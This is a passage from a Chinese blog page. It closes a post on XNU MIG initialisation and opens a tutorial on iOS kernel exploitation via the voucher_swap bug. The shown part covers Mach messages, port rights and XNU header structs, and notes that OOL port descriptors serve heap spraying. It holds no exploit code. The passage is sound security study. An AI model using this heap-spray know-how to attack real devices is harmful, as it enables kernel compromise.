<h2 id="3-2-内核中的MIG初始化"><a href="#3-2-内核中的MIG初始化" class="headerlink" title="3.2 内核中的MIG初始化"></a>3.2 内核中的MIG初始化</h2><p>内核为每种类型的内核对象所对应的MIG子系统维护一个<code>mig_subsystem</code>结构体（<code>osfmk/mach/mig.h</code>）。当IPC子系统在内核启动时被初始化，MIG初始化函数<code>mig_init()</code> （<code>osfmk/kern/ipc_kobject.c</code>）遍历每个子系统，填充一个MIG例程的全局哈希表。下面是这个过程的一个例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// osfmk/mach/mig.h </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">mig_subsystem</span> &#123;</span></span><br><span class="line">	<span class="type">mig_server_routine_t</span> server;   <span class="comment">// pointer to demux routine</span></span><br><span class="line">	<span class="type">mach_msg_id_t</span> start;           <span class="comment">// minimum routine number</span></span><br><span class="line">	<span class="type">mach_msg_id_t</span> end;             <span class="comment">// maximum routine number + 1</span></span><br><span class="line">	<span class="type">mach_msg_size_t</span> maxsize;       <span class="comment">// maximum reply message size</span></span><br><span class="line">	<span class="type">vm_address_t</span> reserved;         <span class="comment">// reserved for MIG use</span></span><br><span class="line">	mig_routine_descriptor routine[<span class="number">1</span>]; <span class="comment">// routine descriptor array </span></span><br><span class="line">&#125; *<span class="type">mig_subsystem_t</span>; <span class="comment">// osfmk/kern/ipc_kobject.c </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span> </span><br><span class="line">	<span class="type">mach_msg_id_t</span> num; </span><br><span class="line">	<span class="type">mig_routine_t</span> routine;</span><br><span class="line">	<span class="type">int</span> size; </span><br><span class="line"><span class="meta">#<span class="keyword">if</span> MACH_COUNTERS</span></span><br><span class="line">	<span class="type">mach_counter_t</span> callcount; </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> </span></span><br><span class="line">&#125; <span class="type">mig_hash_t</span>; </span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_MIG_ENTRIES 1024 </span></span><br><span class="line"><span class="type">mig_hash_t</span> mig_buckets[MAX_MIG_ENTRIES]; </span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">mig_subsystem</span>* <span class="title">mig_e</span>[] =</span> &#123;</span><br><span class="line">	(<span class="type">const</span> <span class="keyword">struct</span> mig_subsystem *)&amp;mach_vm_subsystem,</span><br><span class="line">	(<span class="type">const</span> <span class="keyword">struct</span> mig_subsystem *)&amp;mach_port_subsystem,</span><br><span class="line">	(<span class="type">const</span> <span class="keyword">struct</span> mig_subsystem *)&amp;mach_host_subsystem,</span><br><span class="line">	...</span><br><span class="line">	(<span class="type">const</span> <span class="keyword">struct</span> mig_subsystem *)&amp;is_iokit_subsystem),</span><br><span class="line">	... </span><br><span class="line">&#125;; </span><br><span class="line"><span class="type">void</span> <span class="title function_">mig_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> i, n = <span class="keyword">sizeof</span>(mig_e)/<span class="keyword">sizeof</span>(<span class="type">const</span> <span class="keyword">struct</span> mig_subsystem *);</span><br><span class="line">	<span class="type">int</span> howmany;</span><br><span class="line">	<span class="type">mach_msg_id_t</span> j, pos, nentry, range;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123; <span class="comment">// for each mig_e[i]</span></span><br><span class="line">		range = mig_e[i]-&gt;end - mig_e[i]-&gt;start;</span><br><span class="line">		... </span><br><span class="line">		<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; range; j++) &#123; <span class="comment">// for each routine[j] in mig_e[i]</span></span><br><span class="line">			...  </span><br><span class="line">      <span class="comment">// populate mig_buckets hash table with routines         </span></span><br><span class="line">		&#125;     </span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-03-18T01:38:20.000Z" title="2022/3/18 09:38:20">2022-03-18</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-05-02T12:39:22.426Z" title="2022/5/2 20:39:22">2022-05-02</time></span><span class="level-item">2 hours read (About 18405 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/03/18/%E4%BB%8Evoucher_swap%E6%BC%8F%E6%B4%9E%E5%BC%80%E5%A7%8B%E5%AD%A6iOS%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8/">从voucher_swap漏洞开始学iOS内核利用</a></p><div class="content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="Mach消息"><a href="#Mach消息" class="headerlink" title="Mach消息"></a>Mach消息</h3><p>Mach IPC，从Mach微内核派生而来，是最快的IPC机制之一。</p>
<ul>
<li>Mach IPC基于单向通信。</li>
<li>Mach IPC中的通信以Mach消息的形式在端口之间进行，根据消息头中设置的特定位，消息可以是简单的也可以是复杂的。</li>
<li>发送和接收消息必须具有相应的端口权限：<ul>
<li>MACH_PORT_RIGHT_SEND-允许发送消息</li>
<li>MACH_PORT_RIGHT_RECEIVE-允许接收消息</li>
<li>MACH_PORT_RIGHT_SEND_ONCE-允许发送一次消息</li>
<li>MACH_PORT_RIGHT_PORT_SET-面向一组端口接收或发送消息</li>
<li>MACH_PORT_RIGHT_DEAD_NAME-表示因为对应的端口被销毁或者已经发送了一次消息从而无效的SEND或者SEND_ONCE权限</li>
</ul>
</li>
<li>Mach端口权限可以嵌入并通过Mach消息发送。</li>
<li>一个端口可以有多个发送权限，但只有一个接收权限。发送权限可以克隆，接收权限不能。</li>
<li>发送的Mach消息在接收方收到之前，将保存在内核的队列中。</li>
<li>iOS中最重要的二进制文件之一launchd充当引导服务器并允许进程之间相互通信。launchd可以帮助一个进程查找另一个进程，因为所有进程都通过launchd启动并在启动时注册。因此，launchd可以实现节流（throttling）并在某些情况下允许或拒绝查找，从而充当安全控件。launchd非常重要，是第一个启动的守护进程（PID为1），launchd中的任何crash将立即触发内核Panic。</li>
<li>消息由进程内的线程发送和接收，充当进程内的执行单元，但是，端口权限保留在任务级别，并可在任务的ipc_space中找到。</li>
</ul>
<h4 id="简单消息"><a href="#简单消息" class="headerlink" title="简单消息"></a>简单消息</h4><p>简单消息的body会被内核忽略，<code>osfmk/mach/message.h</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="type">mach_msg_size_t</span> msgh_descriptor_count;</span><br><span class="line">&#125; <span class="type">mach_msg_body_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSG_BODY_NULL (mach_msg_body_t *) 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSG_DESCRIPTOR_NULL (mach_msg_descriptor_t *) 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span>	<span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">mach_msg_bits_t</span>	msgh_bits; <span class="comment">// 包含消息属性的位图</span></span><br><span class="line">  <span class="type">mach_msg_size_t</span>	msgh_size; <span class="comment">// header+body的大小</span></span><br><span class="line">  <span class="type">mach_port_t</span>		msgh_remote_port; <span class="comment">// 目标端口的发送权限</span></span><br><span class="line">  <span class="type">mach_port_t</span>		msgh_local_port; <span class="comment">// 接收端口的接收权限</span></span><br><span class="line">  <span class="type">mach_port_name_t</span>	msgh_voucher_port; <span class="comment">// voucher用于通过键值对传递消息中的数据</span></span><br><span class="line">  <span class="type">mach_msg_id_t</span>		msgh_id; <span class="comment">// 任意32位值</span></span><br><span class="line">&#125; <span class="type">mach_msg_header_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	msgh_reserved		msgh_voucher_port</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSG_NULL	(mach_msg_header_t *) 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="type">mach_msg_header_t</span>       header;</span><br><span class="line">        <span class="type">mach_msg_body_t</span>         body;</span><br><span class="line">&#125; <span class="type">mach_msg_base_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span> <span class="type">mach_msg_bits_t</span>;</span><br></pre></td></tr></table></figure>

<p><code>mach_msg_bits_t</code>取值的定义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSGH_BITS_ZERO		0x00000000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSGH_BITS_REMOTE_MASK	0x0000001f</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSGH_BITS_LOCAL_MASK	0x00001f00</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSGH_BITS_VOUCHER_MASK	0x001f0000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	MACH_MSGH_BITS_PORTS_MASK		\</span></span><br><span class="line"><span class="meta">		(MACH_MSGH_BITS_REMOTE_MASK |	\</span></span><br><span class="line"><span class="meta">		 MACH_MSGH_BITS_LOCAL_MASK |	\</span></span><br><span class="line"><span class="meta">		 MACH_MSGH_BITS_VOUCHER_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSGH_BITS_COMPLEX		0x80000000U	<span class="comment">/* message is complex */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSGH_BITS_USER             0x801f1f1fU	<span class="comment">/* allowed bits user-&gt;kernel */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	MACH_MSGH_BITS_RAISEIMP		0x20000000U	<span class="comment">/* importance raised due to msg */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSGH_BITS_DENAP		MACH_MSGH_BITS_RAISEIMP</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	MACH_MSGH_BITS_IMPHOLDASRT	0x10000000U	<span class="comment">/* assertion help, userland private */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSGH_BITS_DENAPHOLDASRT	MACH_MSGH_BITS_IMPHOLDASRT</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	MACH_MSGH_BITS_CIRCULAR		0x10000000U	<span class="comment">/* message circular, kernel private */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	MACH_MSGH_BITS_USED		0xb01f1f1fU</span></span><br></pre></td></tr></table></figure>

<ul>
<li>如果<code>MACH_MSGH_BITS_COMPLEX</code>没有打开，内核将假定消息的主体不包含端口权限或 OOL 数据，用户任务在解析消息主体时需要小心，因为消息主体中的mach_msg_type可能会对内容 “撒谎”，从而可能导致未定义的行为。</li>
<li><code>MACH_MSGH_BITS_REMOTE</code>决定如何解释<code>msg_remote_port</code>字段，处理类似于<code>msgt_name</code>，结果必须是send或者send-once类型的权限。</li>
<li><code>MACH_MSGH_BITS_LOCAL</code>决定如何解释<code>msgh_local_port</code>字段，处理方式与<code>msgt_name</code>类似，结果也必须是send或者send-once类型的权限。</li>
<li><code>MACH_MSGH_BITS_VOUCHER</code>决定如何解释<code>msgh_voucher_port</code>字段，处理方式与<code>msgt_nam</code>e类似，结果必须是一个发送权（而且<code>msgh_voucher_port</code>字段必须是一个<code>Mach voucher</code>内核对象的发送权的名称）。</li>
<li><code>MACH_MSGH_BITS()</code>结合了两个<code>MACH_MSG_TYPE_*</code>值，用于远程和本地字段，变成一个适合<code>msgh_bits</code>的单一值。</li>
<li><code>MACH_MSGH_BITS_CIRCULAR</code>应该是零；是内部使用的。</li>
<li>未使用的位应该是零，保留给内核或未来的接口扩展。</li>
</ul>
<p>除了header，还包含一些描述符，在消息主体中指定了描述符的数量（msgh_descriptor_count），<code>BUILD/obj/EXPORT_HDRS/osfmk/mach/message.h</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__LP64__) &amp;&amp; defined(KERNEL)</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">mach_msg_port_descriptor_t</span>		port;</span><br><span class="line">  <span class="type">mach_msg_ool_descriptor32_t</span>		out_of_line;</span><br><span class="line">  <span class="type">mach_msg_ool_ports_descriptor32_t</span>	ool_ports;</span><br><span class="line">  <span class="type">mach_msg_type_descriptor_t</span>		type;</span><br><span class="line">&#125; <span class="type">mach_msg_descriptor_t</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">mach_msg_port_descriptor_t</span>		port;</span><br><span class="line">  <span class="type">mach_msg_ool_descriptor_t</span>		out_of_line;</span><br><span class="line">  <span class="type">mach_msg_ool_ports_descriptor_t</span>	ool_ports;</span><br><span class="line">  <span class="type">mach_msg_type_descriptor_t</span>		type;</span><br><span class="line">&#125; <span class="type">mach_msg_descriptor_t</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="type">mach_msg_size_t</span> msgh_descriptor_count;</span><br><span class="line">&#125; <span class="type">mach_msg_body_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSG_BODY_NULL (mach_msg_body_t *) 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSG_DESCRIPTOR_NULL (mach_msg_descriptor_t *) 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span>	<span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">mach_msg_bits_t</span>	msgh_bits;</span><br><span class="line">  <span class="type">mach_msg_size_t</span>	msgh_size;</span><br><span class="line">  <span class="type">mach_port_t</span>		msgh_remote_port;</span><br><span class="line">  <span class="type">mach_port_t</span>		msgh_local_port;</span><br><span class="line">  <span class="type">mach_port_name_t</span>	msgh_voucher_port;</span><br><span class="line">  <span class="type">mach_msg_id_t</span>		msgh_id;</span><br><span class="line">&#125; <span class="type">mach_msg_header_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	msgh_reserved		msgh_voucher_port</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSG_NULL	(mach_msg_header_t *) 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="type">mach_msg_header_t</span>       header;</span><br><span class="line">        <span class="type">mach_msg_body_t</span>         body;</span><br><span class="line">&#125; <span class="type">mach_msg_base_t</span>;</span><br></pre></td></tr></table></figure>

<p><code>mach_msg_type_descriptor_t</code>表示是什么类型的描述符，其他字段则包含相应的数据，类型如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 在一个复杂的mach消息中，mach_msg_header_t后面是一个描述符计数，然后是一个包含该数量描述符的数组(mach_msg_*_descriptor_t)</span></span><br><span class="line"><span class="comment"> * mach_msg_type_descriptor_t字段表示该描述符的类型</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 注意，在LP64中，各种类型的描述符不再都是与mach_msg_descriptor_t相同的大小，所以数组不能像预期的那样被索引。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span> <span class="type">mach_msg_descriptor_type_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSG_PORT_DESCRIPTOR 		0           <span class="comment">// 在消息中发送一个端口</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSG_OOL_DESCRIPTOR  		1           <span class="comment">// 在消息中发送OOL数据</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSG_OOL_PORTS_DESCRIPTOR 		2     <span class="comment">// 在消息中发送OOL端口数组</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSG_OOL_VOLATILE_DESCRIPTOR  	3   <span class="comment">// 在消息中发送易失性数据</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(4)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">natural_t</span>			pad1;</span><br><span class="line">  <span class="type">mach_msg_size_t</span>		pad2;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span>			pad3 : <span class="number">24</span>;</span><br><span class="line">  <span class="type">mach_msg_descriptor_type_t</span>	type : <span class="number">8</span>;</span><br><span class="line">&#125; <span class="type">mach_msg_type_descriptor_t</span>;</span><br></pre></td></tr></table></figure>

<p>OOL指Out-of-line，OOL端口描述符广泛应用于使用用户控制的数据来进行堆喷。每当使用<code>MACH_MSG_OOL_DESCRIPTOR</code>时，将在内核堆中分配具有所有端口指针的数组。</p>
<p>端口在用户态中用<code>mach_port_t</code>或<code>mach_port_name_t</code>表示，但内核中不采用这种表示。</p>
<ul>
<li><code>mach_port_name_t</code>表示本地命名空间标识，但未关联任何端口权限，并且在任务命名空间之外基本上没有任何意义。</li>
<li>进程从内核处接收到<code>mach_port_t</code>，就会将关联的端口权限映射到接收者，<code>mach_port_name_t</code>则不会。</li>
<li><code>mach_port_t</code>通常至少拥有一项权限，可以是RECEIVE、SEND或SEND_ONCE。</li>
<li>获得<code>mach_port_t</code>的句柄会自动在调用者的命名空间中创建关联的发送权限。</li>
</ul>
<p>发送或接收消息，可以使用<code>osfmk/mach/message.h</code>中定义的<code>mach_msg</code>和<code>mach_msg_overwrite</code> API。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">kern_return_t</span> kret;</span><br><span class="line"><span class="comment">// Initialize a port</span></span><br><span class="line"><span class="type">mach_port_t</span> port;</span><br><span class="line"><span class="comment">// Allocate the port and get a receive right</span></span><br><span class="line">kret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;port);</span><br><span class="line"><span class="keyword">if</span> (kret != KERN_SUCCESS)</span><br><span class="line">	T_FAIL(<span class="string">&quot;mach_port_allocate: %s (%d)&quot;</span>, mach_error_string(kret), kret);</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *	Routine:	mach_msg_overwrite</span></span><br><span class="line"><span class="comment"> *	Purpose:</span></span><br><span class="line"><span class="comment"> *		Send and/or receive a message.  If the message operation</span></span><br><span class="line"><span class="comment"> *		is interrupted, and the user did not request an indication</span></span><br><span class="line"><span class="comment"> *		of that fact, then restart the appropriate parts of the</span></span><br><span class="line"><span class="comment"> *		operation silently (trap version does not restart).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *		Distinct send and receive buffers may be specified.  If</span></span><br><span class="line"><span class="comment"> *		no separate receive buffer is specified, the msg parameter</span></span><br><span class="line"><span class="comment"> *		will be used for both send and receive operations.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *		In addition to a distinct receive buffer, that buffer may</span></span><br><span class="line"><span class="comment"> *		already contain scatter control information to direct the</span></span><br><span class="line"><span class="comment"> *		receiving of the message.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">__WATCHOS_PROHIBITED __TVOS_PROHIBITED</span><br><span class="line"><span class="keyword">extern</span> <span class="type">mach_msg_return_t</span>	<span class="title function_">mach_msg_overwrite</span><span class="params">(</span></span><br><span class="line"><span class="params">					<span class="type">mach_msg_header_t</span> *msg,</span></span><br><span class="line"><span class="params">					<span class="type">mach_msg_option_t</span> option,</span></span><br><span class="line"><span class="params">					<span class="type">mach_msg_size_t</span> send_size,</span></span><br><span class="line"><span class="params">					<span class="type">mach_msg_size_t</span> rcv_size,</span></span><br><span class="line"><span class="params">					<span class="type">mach_port_name_t</span> rcv_name,</span></span><br><span class="line"><span class="params">					<span class="type">mach_msg_timeout_t</span> timeout,</span></span><br><span class="line"><span class="params">					<span class="type">mach_port_name_t</span> notify,</span></span><br><span class="line"><span class="params">					<span class="type">mach_msg_header_t</span> *rcv_msg,</span></span><br><span class="line"><span class="params">					<span class="type">mach_msg_size_t</span> rcv_limit)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span>	KERNEL</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *	Routine:	mach_msg</span></span><br><span class="line"><span class="comment"> *	Purpose:</span></span><br><span class="line"><span class="comment"> *		Send and/or receive a message.  If the message operation</span></span><br><span class="line"><span class="comment"> *		is interrupted, and the user did not request an indication</span></span><br><span class="line"><span class="comment"> *		of that fact, then restart the appropriate parts of the</span></span><br><span class="line"><span class="comment"> *		operation silently (trap version does not restart).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">__WATCHOS_PROHIBITED __TVOS_PROHIBITED</span><br><span class="line"><span class="keyword">extern</span> <span class="type">mach_msg_return_t</span>	<span class="title function_">mach_msg</span><span class="params">(</span></span><br><span class="line"><span class="params">					<span class="type">mach_msg_header_t</span> *msg,</span></span><br><span class="line"><span class="params">					<span class="type">mach_msg_option_t</span> option,</span></span><br><span class="line"><span class="params">					<span class="type">mach_msg_size_t</span> send_size,</span></span><br><span class="line"><span class="params">					<span class="type">mach_msg_size_t</span> rcv_size,</span></span><br><span class="line"><span class="params">					<span class="type">mach_port_name_t</span> rcv_name,</span></span><br><span class="line"><span class="params">					<span class="type">mach_msg_timeout_t</span> timeout,</span></span><br><span class="line"><span class="params">					<span class="type">mach_port_name_t</span> notify)</span>;</span><br></pre></td></tr></table></figure>

<p>如果有一个端口的发送权限，可以使用<code>mach_port_insert_right</code>将这个发送权限插入另一个任务，然后使用<code>mach_msg</code>发送消息。如前所述，<code>mach_port_name_t</code>在任务命名空间之外毫无意义，这就是为什么需要将<code>任务(ipc_space_t)</code>与<code>mach_port_name_t</code>一起指定的原因，以便内核可以将指定的<code>名称(mach_port_name_t)</code>放入该任务的命名空间。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *	Routine:	mach_port_insert_right [kernel call]</span></span><br><span class="line"><span class="comment"> *	Purpose:</span></span><br><span class="line"><span class="comment"> *		Inserts a right into a space, as if the space</span></span><br><span class="line"><span class="comment"> *		voluntarily received the right in a message,</span></span><br><span class="line"><span 